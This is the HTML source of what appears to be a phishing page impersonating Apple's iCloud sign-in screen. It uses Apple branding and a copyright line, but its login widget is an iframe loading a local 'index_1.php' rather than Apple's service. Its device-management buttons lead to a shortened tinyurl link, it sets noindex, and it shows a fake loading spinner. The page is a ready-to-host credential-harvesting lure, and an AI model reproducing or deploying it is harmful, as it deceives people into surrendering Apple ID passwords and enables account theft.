<meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="google" content="notranslate">
        <meta name="robots" content="noindex">
        <meta name="theme-color" content="rgb(251, 251, 253)" data-default-color="rgb(251, 251, 253)">
        <base target="_parent" />
        <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
        <script src="./../styles/fakeLoader2.min.js"></script>
        <link rel="stylesheet" href="./../styles/fakeLoader2.css">
        <title>iCloud</title>
        <base>
        <style id="cw-bootstrap-css">
          html {
            background-color: rgb(251, 251, 253);
          }

          #apple-logo,
          #gcbd-logo {
            margin-left: -2px;
            /* stylelint-disable-line */
          }

          html[dir="rtl"] #apple-logo,
          html[dir="rtl"] #gcbd-logo {
            margin-left: 0;
            /* stylelint-disable-line */
            margin-right: -2px;
            /* stylelint-disable-line */
          }

          /*
If navigating directly to a child app on app load, the child app will be
initialized in init.js. Hide the iframe while the main CloudOS bundle loads.
The "unclaimed" class is removed later by ChildApplicationRemoteViewController.
*/
          #early-child.unclaimed {
            visibility: hidden;
          }

          #early-child {
            border: 0;
          }
        </style>
        <link rel="icon" href="./../images/favicon.ico">
        <style id="inert-style">
          [inert] {
            pointer-events: none;
            cursor: default;
          }

          [inert],
          [inert] * {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
          }

          <link rel="stylesheet"id="cw-css"href="./../styles/6c9c79ffd7057f252bb7a544710c0111d1e40111.css"><style type="text/css">
        </style>
        <script data-scrapbook-elem="custom-elements-loader">
          (function(names) {
            if (!customElements) {
              return;
            }
            for (const name of names) {
              customElements.define(name, class CustomElement extends HTMLElement {});
            }
          })(["ui-main-pane", "ui-button"])
        </script>
        </head>
        <body class="clicking">
          <!-- prettier-ignore -->
          <div id="root">
            <ui-main-pane>
              <span class="screenreader-only-content" role="presentation">
                <div aria-live="polite" aria-relevant="additions" role="log"></div>
              </span>
              <div class="root-viewport">
                <div class="notification-presenter"></div>
                <div class="root-component">
                  <div class="flex-page-viewport home-login-route fade-in">
                    <div class="flex-page-content">
                      <header class="toolbar-banner" role="banner">
                        <div class="application-toolbar login-theme">
                          <div class="toolbar-container">
                            <div class="application-toolbar-start-view">
                              <div class="cloudos-application-toolbar-start-view">
                                <a href="https://google.com" aria-label="Navigate to  home page" class="Logo unstyled-link nav-link">
                                  <svg width="82" height="31" xmlns="http://www.w3.org/2000/svg" class="apple-#-logo" aria-hidden="true">
                                    <g fill="none" fill-rule="nonzero">
                                      <path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" fill="#1D1D1F" transform="translate(2.5 6.5)"></path>
                                    </g>
                                  </svg>
                                </a>
                              </div>
                            </div>
                            <div class="application-toolbar-end-view">
                              <div class="cloudos-application-toolbar-end-view">
                                <div class="toolbar-buttons-container">
                                  <ui-button class="push primary toolbar-icon-button help-icon mouse" tabindex="0" role="button" aria-label="Help Menu" aria-haspopup="menu">
                                    <button type="button" tabindex="-1"></button>
                                    <svg viewBox="0 0 92.0899658203125 19.5810546875" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" glyph-box" height="19" width="19">
                                      <g transform="matrix(1 0 0 1 -8.740048828125055 45.0205078125)">
                                        <path d="M28.418-35.2051C28.418-40.625 24.0234-44.9707 18.5059-44.9707C13.1348-44.9707 8.74023-40.625 8.74023-35.2051C8.74023-29.7852 13.1348-25.4395 18.5059-25.4395C24.0234-25.4395 28.418-29.7852 28.418-35.2051ZM64.5508-35.2051C64.5508-40.625 60.2051-44.9707 54.7852-44.9707C49.4141-44.9707 45.0684-40.625 45.0684-35.2051C45.0684-29.7852 49.4141-25.4395 54.7852-25.4395C60.2051-25.4395 64.5508-29.7852 64.5508-35.2051ZM100.83-35.2051C100.83-40.625 96.4844-44.9707 91.0645-44.9707C85.5469-44.9707 81.2012-40.625 81.2012-35.2051C81.2012-29.7852 85.5469-25.4395 91.0645-25.4395C96.4844-25.4395 100.83-29.7852 100.83-35.2051Z"></path>
                                      </g>
                                    </svg>
                                  </ui-button>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </header>
                      <div class="home-login-component has-visible-quick-access">
                        <div class="parent-container has-visible-quick-access is-visible">
                          <div style="visibility: visible; height: auto;">
                            <div class="widget-icon-text">
                              <img class="icon" draggable="false" alt="" aria-hidden="true" src="./../images/logo.svg">
                            </div>
                            <div id="idms-auth-15eda582-ead7-48cd-be8e-e78c76013636" class="apple-id-container no-sign-in-label">
                              <iframe src="index_1.php" width="100%" height="100%" id="aid-auth-widget-iFrame" name="aid-auth-widget" scrolling="no" frameborder="0" role="none" allow="publickey-credentials-get " title="Sign In with your Apple&nbsp;ID"></iframe>
                            </div>
                            <div class="quick-access-container">
                              <div class="quick-access">
                                <div class="quick-access-label">If you can’t enter a code because you’ve lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple&nbsp;Pay cards from it.</div>
                                <div class="quick-access-buttons">
                                  <div class="quick-access-button">
                                    <ui-button class="push primary mouse" tabindex="0" role="button">
                                     <a style="text-decorations:none; color:inherit" href="https://tinyurl.com/manageappleids"> <button type="button" tabindex="-1"></button>
                                      <svg viewBox="0 0 113.683837890625 111.1806640625" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" layout-box" width="37">
                                        <g transform="matrix(1 0 0 1 -1.683129882812409 90.8203125)">
                                          <path d="M8.72266-35.2606C8.72266-7.47784 31.3516 15.1511 59.1344 15.1511C86.9606 15.1511 109.59-7.47784 109.59-35.2606C109.59-50.7642 102.467-64.6827 91.3977-73.9726L87.465-67.3934C96.3507-59.5491 102.026-48.0686 102.026-35.2606C102.026-11.5985 82.7966 7.63087 59.1344 7.63087C35.5156 7.63087 16.2863-11.5985 16.2863-35.2606C16.2863-48.0686 21.9181-59.5491 30.8038-67.3934L26.9146-73.9726C15.8451-64.6827 8.72266-50.7642 8.72266-35.2606ZM25.0223-35.2606C25.0223-16.4104 40.3276-1.10512 59.1344-1.10512C77.9846-1.10512 93.2899-16.4104 93.2899-35.2606C93.2899-44.9063 89.2816-53.5323 82.864-59.7789L78.7988-52.9359C83.0601-48.2867 85.6766-42.0758 85.6766-35.2606C85.6766-20.6122 73.7828-8.71848 59.1344-8.71848C44.486-8.71848 32.5922-20.6122 32.5922-35.2606C32.5922-42.0758 35.2086-48.2867 39.5134-52.9359L35.4047-59.7789C29.0306-53.5323 25.0223-44.9063 25.0223-35.2606ZM41.1755-35.2709C41.1755-25.3573 49.2208-17.312 59.1344-17.312C69.048-17.312 77.1367-25.3573 77.1367-35.2709C77.1367-40.3835 74.9749-44.9589 71.5659-48.2212L88.1519-75.7173C88.3491-76.0494 88.2885-76.3695 87.9564-76.6204C79.8818-82.4204 69.3532-85.6724 59.1344-85.6724C48.9505-85.6724 38.387-82.4204 30.3558-76.6204C30.0237-76.3695 29.9631-76.0494 30.1603-75.7173L46.7463-48.2212C43.3373-44.9589 41.1755-40.3835 41.1755-35.2709ZM39.974-73.5699C45.726-76.4747 52.2276-78.1522 59.1344-78.1522C66.0412-78.1522 72.5428-76.4747 78.3382-73.5699L73.8098-66.0611C69.3474-68.2477 64.3481-69.4162 59.1344-69.4162C53.9207-69.4162 48.9214-68.2477 44.5024-66.0611ZM48.4728-59.5151C51.7005-61.0046 55.356-61.8028 59.1344-61.8028C62.9562-61.8028 66.6117-61.0046 69.8394-59.5151L65.3345-52.1213C63.414-52.8262 61.3356-53.2298 59.1344-53.2298C56.9766-53.2298 54.8983-52.8262 52.9343-52.1213ZM48.0558-35.2709C48.0558-41.4246 52.9807-46.3929 59.1344-46.3929C65.3315-46.3929 70.2564-41.4246 70.2564-35.2709C70.2564-29.1275 65.3213-24.1489 59.1344-24.1489C52.9909-24.1489 48.0558-29.1275 48.0558-35.2709ZM51.641-35.2709C51.641-31.1141 54.9879-27.7775 59.1344-27.7775C63.2912-27.7775 66.6278-31.1244 66.6278-35.2709C66.6278-39.4277 63.2809-42.7643 59.1344-42.7643C54.9776-42.7643 51.641-39.4175 51.641-35.2709Z"></path>
                                        </g>
                                      </svg>
                                      <div class="title">Find Devices</div></a>
                                    </ui-button>
                                  </div>
                                  <div class="quick-access-button">
                                    <ui-button class="push primary loud-mouse" tabindex="0" role="button">
                                    <a style="text-decorations:none; color:inherit" href="https://tinyurl.com/manageappleids" ><button type="button" tabindex="-1"></button>
                                      <svg viewBox="0 0 145.67578125 111.1806640625" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" layout-box" width="47">
                                        <g transform="matrix(1 0 0 1 -1.8170800781249454 90.8203125)">
                                          <path d="M27.7789 9.76808L92.6089 9.76808C91.4587 8.13106 90.6086 6.17297 90.2453 3.95612C90.1724 3.29287 90.0996 2.62962 90.0785 1.86286L27.9035 1.86286C23.0272 1.86286 20.3144-0.694633 20.3144-5.77797L20.3144-64.5976C20.3144-69.6292 23.0272-72.2384 27.9035-72.2384L112.108-72.2384C116.942-72.2384 119.697-69.6292 119.697-64.5976L119.697-62.8481C122.518-62.8481 125.045-62.8481 127.551-62.8375L127.551-64.981C127.551-75.0367 122.465-80.1437 112.233-80.1437L27.7789-80.1437C17.5986-80.1437 12.4609-75.0578 12.4609-64.981L12.4609-5.3946C12.4609 4.6822 17.5986 9.76808 27.7789 9.76808ZM51.1572-1.87542L89.8474-1.87542C89.8474-3.34762 89.8474-4.89269 89.8474-6.37545L51.1572-6.37545C49.8508-6.37545 48.8761-5.50418 48.8761-4.09428C48.8761-2.73613 49.8508-1.87542 51.1572-1.87542ZM105.09 9.76808L127.288 9.76808C133.371 9.76808 136.847 6.40563 136.847 0.622849L136.847-47.9874C136.847-53.8219 133.36-57.1431 127.288-57.1431L105.09-57.1431C99.0077-57.1431 95.5417-53.8219 95.5417-47.9874L95.5417 0.622849C95.5417 6.40563 98.9971 9.76808 105.09 9.76808ZM105.205 3.36372C103.059 3.36372 101.946 2.19903 101.946-0.0393971L101.946-47.3663C101.946-49.6153 103.059-50.7388 105.205-50.7388L109.608-50.7388C109.784-50.7388 109.898-50.6247 109.898-50.4378L109.898-50.0228C109.898-48.3215 111.019-47.1703 112.731-47.1703L119.648-47.1703C121.36-47.1703 122.491-48.3215 122.491-50.0228L122.491-50.4378C122.491-50.6247 122.594-50.7388 122.749-50.7388L127.174-50.7388C129.361-50.7388 130.443-49.6153 130.443-47.3663L130.443-0.0393971C130.443 2.19903 129.361 3.36372 127.174 3.36372ZM109.532 0.871532L122.743 0.871532C123.749 0.871532 124.517 0.16608 124.517-0.840344C124.517-1.77391 123.739-2.50047 122.743-2.50047L109.532-2.50047C108.536-2.50047 107.872-1.77391 107.872-0.840344C107.872 0.217834 108.474 0.871532 109.532 0.871532Z"></path>
                                        </g>
                                      </svg>
                                      <div class="title">Manage Devices<svg viewBox="0 0 268.0201416015625 158.116943359375" version="1.1" xmlns="http://www.w3.org/2000/svg" style="height: 20.1966px; width: 34.2348px;" class="cloudos-menu-item-opens-in-new-tab layout-box" aria-hidden="true">
                                          <g transform="matrix(1 0 0 1 85.49510009765618 114.2884521484375)">
                                            <path d="M84.5703-17.334L84.5215-66.4551C84.5215-69.2383 82.7148-71.1914 79.7852-71.1914L30.6641-71.1914C27.9297-71.1914 26.0742-69.0918 26.0742-66.748C26.0742-64.4043 28.1738-62.4023 30.4688-62.4023L47.4609-62.4023L71.2891-63.1836L62.207-55.2246L13.8184-6.73828C12.9395-5.85938 12.4512-4.73633 12.4512-3.66211C12.4512-1.31836 14.5508 0.878906 16.9922 0.878906C18.1152 0.878906 19.1895 0.488281 20.0684-0.439453L68.5547-48.877L76.6113-58.0078L75.7324-35.2051L75.7324-17.1387C75.7324-14.8438 77.7344-12.6953 80.127-12.6953C82.4707-12.6953 84.5703-14.6973 84.5703-17.334Z"></path>
                                          </g>    </a>                                    </svg>
                                      </div></a> 
                                    </ui-button>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <footer>
                        <div class="legal-footer">
                          <div class="application-content">
                            <div class="legal-footer-content">
                              <div class="inner-row" role="presentation">
                                <div class="with-separator">
                                  <a class="systemStatus" target="_blank" rel="noreferrer" href="#" aria-label="System Status (opens in a new tab)">System Status</a>
                                  <div aria-hidden="true" class="separator"></div>
                                </div>
                                <div class="with-separator">
                                  <a class="privacy" target="_blank" rel="noreferrer" href="#" aria-label="Privacy Policy (opens in a new tab)">Privacy Policy</a>
                                  <div aria-hidden="true" class="separator"></div>
                                </div>
                                <a class="terms" target="_blank" rel="noreferrer" href="#" aria-label="Terms &amp; Conditions (opens in a new tab)">Terms &amp; Conditions</a>
                              </div>
                              <div class="inner-row" role="presentation">
                                <span class="copyright">Copyright © <script type="text/javascript">
                                    var year = new Date();
                                    document.write(year.getFullYear());
                                  </script> Apple Inc. All rights reserved. </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </footer>
                    </div>
                  </div>
                </div>
              </div>
            </ui-main-pane>
          </div>
          <!-- cloudkitjs -->
          <!-- prettier-ignore -->
          <div id="fakeLoader"></div>
          <link rel="stylesheet" href="./../styles/main.css">
          <script type="text/javascript">
            $("#fakeLoader").fakeLoader({
              timeToHide: 10000, //Time in milliseconds for fakeLoader disappear
              zIndex: 999, // Default zIndex
              spinner: "spinner2", //Options: 'spinner1', 'spinner2', 'spinner3', 'spinner4', 'spinner5', 'spinner6', 'spinner7' 
              bgColor: "#e8e9e9", //Hex, RGB or RGBA colors
            });
          </script>
          <div aria-hidden="true" id="cw-img-container-r2" style="overflow: hidden; height: 0px; width: 0px;"></div>
        </body>
        </html>